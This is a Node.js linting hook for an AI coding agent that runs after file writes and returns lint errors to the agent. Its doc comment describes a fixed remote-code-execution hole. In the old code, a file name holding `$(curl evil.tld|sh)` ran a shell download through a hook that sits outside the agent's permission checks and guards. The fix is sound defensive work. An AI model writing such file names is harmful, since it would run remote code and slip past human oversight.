#!/usr/bin/env node
// code-validator.js — PostToolUse hook (Write, Edit)
// Runs project linter after code changes to catch issues early.
// Exit 0 always. When issues are found, emits PostToolUse JSON
// { decision: "block", reason } so the lint output is fed back to the
// agent for self-correction (stderr on exit 0 never reaches the model).

// execFileSync, never execSync: this hook receives an agent-chosen file path and runs a
// linter on it. A command STRING goes through a shell; an argv array does not.
const { execFileSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const { formatTOON } = require('./lib/toon-formatter.js');
const { isHookDisabled, emitJson } = require('./lib/hook-input.js');

// File extensions that should be linted
const LINTABLE_EXTENSIONS = new Set([
  '.js', '.jsx', '.ts', '.tsx', '.mjs', '.cjs',  // JavaScript/TypeScript
  '.py',                                            // Python
  '.go',                                            // Go
  '.java',                                          // Java
  '.rs',                                            // Rust
  '.vue', '.svelte',                                // Frontend frameworks
]);

async function main() {
  try {
    if (isHookDisabled('code-validator')) process.exit(0);

    const input = await readStdin();
    if (!input) process.exit(0);

    const data = JSON.parse(input);
    const filePath = (data.tool_input && (data.tool_input.file_path || data.tool_input.path)) || '';
    if (!filePath) process.exit(0);

    // Check if this is a lintable file
    const ext = path.extname(filePath).toLowerCase();
    if (!LINTABLE_EXTENSIONS.has(ext)) process.exit(0);

    // Detect and run linter
    const lintResult = detectAndRunLinter(filePath, ext);
    if (!lintResult) process.exit(0);

    if (lintResult.issues > 0) {
      process.stderr.write(formatTOON('CODE VALIDATOR', {
        File: filePath,
        Linter: lintResult.linter,
        Issues: `${lintResult.issues} issue(s) found`,
        Action: 'Fix lint issues before proceeding',
        Output: lintResult.output.substring(0, 500)
      }));
      emitJson({
        decision: 'block',
        reason:
          `[RMAD code-validator] ${lintResult.linter} found ${lintResult.issues} issue(s) in ${filePath}. ` +
          `Fix them before proceeding (CLAUDE.md lint rule):\n` +
          lintResult.output.substring(0, 1200)
      });
    }

    process.exit(0);
  } catch (err) {
    process.exit(0);
  }
}

function detectAndRunLinter(filePath, ext) {
  const cwd = process.cwd();

  // JavaScript/TypeScript
  if (['.js', '.jsx', '.ts', '.tsx', '.mjs', '.cjs', '.vue', '.svelte'].includes(ext)) {
    // Check for ESLint config
    const eslintConfigs = ['.eslintrc.js', '.eslintrc.json', '.eslintrc.yml', '.eslintrc.yaml', 'eslint.config.js', 'eslint.config.mjs'];
    const hasEslint = eslintConfigs.some(c => fs.existsSync(path.join(cwd, c))) ||
      hasPackageDep(cwd, 'eslint');

    if (hasEslint) {
      return runLinter('eslint', 'npx', ['eslint', filePath, '--no-error-on-unmatched-pattern', '--format', 'compact']);
    }

    // Check for Biome
    if (fs.existsSync(path.join(cwd, 'biome.json')) || hasPackageDep(cwd, '@biomejs/biome')) {
      return runLinter('biome', 'npx', ['biome', 'check', filePath]);
    }
  }

  // Python
  if (ext === '.py') {
    // Check for ruff (preferred) then flake8 then pylint
    if (fs.existsSync(path.join(cwd, 'ruff.toml')) || fs.existsSync(path.join(cwd, '.ruff.toml')) ||
        hasTomlDep(cwd, 'ruff')) {
      return runLinter('ruff', 'ruff', ['check', filePath]);
    }
    if (fs.existsSync(path.join(cwd, '.flake8')) || hasTomlDep(cwd, 'flake8')) {
      return runLinter('flake8', 'flake8', [filePath]);
    }
  }

  // Go
  if (ext === '.go') {
    return runLinter('go-vet', 'go', ['vet', filePath]);
  }

  return null;
}

/**
 * Run a linter with the path as an ARGUMENT, never as shell text.
 *
 * THIS WAS A REMOTE CODE EXECUTION HOLE. The previous form built a command string —
 * `go vet "${filePath}"` — and handed it to execSync, which runs it through /bin/sh on
 * POSIX. Double quotes do not stop `$( )`, backticks, or `\`, so a file named
 * `src/a$(curl evil.tld|sh).go` executed that substitution. The path comes straight from
 * the tool payload, so writing such a file was the whole attack: this hook is registered
 * PostToolUse on Write|Edit, it fires automatically after the write, and hooks run outside
 * the tool-permission model — no Bash approval, no bash-guard, no data-guard. The Go branch
 * needed no linter installed and no config file, because the shell substitutes before it
 * ever looks for `go`.
 *
 * execFileSync takes an argv array and spawns the binary directly. There is no shell, so
 * there is nothing to escape and nothing to get wrong later.
 */
function runLinter(linterName, bin, args) {
  try {
    const output = execFileSync(bin, args, {
      cwd: process.cwd(),
      encoding: 'utf8',
      timeout: 15000,
      shell: false,
      windowsHide: true,
      stdio: ['pipe', 'pipe', 'pipe']
    });
    return { linter: linterName, issues: 0, output: '' };
  } catch (err) {
    // Linter exits non-zero when issues found
    const output = (err.stdout || '') + (err.stderr || '');
    // Count issue lines (rough heuristic)
    const issueLines = output.split('\n').filter(l =>
      l.includes('error') || l.includes('warning') || l.includes('Error') || l.includes('Warning') ||
      /^\s*\d+:\d+/.test(l) || /line \d+/i.test(l)
    ).length;
    return { linter: linterName, issues: Math.max(issueLines, 1), output: output.trim() };
  }
}

function hasPackageDep(cwd, dep) {
  try {
    const pkg = JSON.parse(fs.readFileSync(path.join(cwd, 'package.json'), 'utf8'));
    return !!(pkg.dependencies?.[dep] || pkg.devDependencies?.[dep]);
  } catch { return false; }
}

function hasTomlDep(cwd, dep) {
  try {
    const toml = fs.readFileSync(path.join(cwd, 'pyproject.toml'), 'utf8');
    return toml.includes(dep);
  } catch { return false; }
}

function readStdin() {
  return new Promise((resolve) => {
    let data = '';
    process.stdin.setEncoding('utf8');
    process.stdin.on('data', (chunk) => { data += chunk; });
    process.stdin.on('end', () => resolve(data));
    process.stdin.on('error', () => resolve(''));
    setTimeout(() => resolve(data), 3000);
  });
}

main();
